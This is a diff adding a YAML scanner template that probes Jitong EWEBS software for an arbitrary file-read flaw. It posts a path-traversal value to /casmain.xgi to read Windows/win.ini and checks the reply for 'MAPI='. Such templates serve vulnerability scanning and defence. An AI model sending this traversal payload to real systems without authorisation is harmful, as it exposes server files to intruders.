@@ -1,0 +1,16 @@
+name: Jitong EWEBS Fileread
+manual: true
+query: body="极通软件"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /casmain.xgi
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: Language_S=../../../../../../../Windows/win.ini
+    expression: response.body.bcontains(b"MAPI=")
+expression: r0()
+detail:
+  tags: fileread
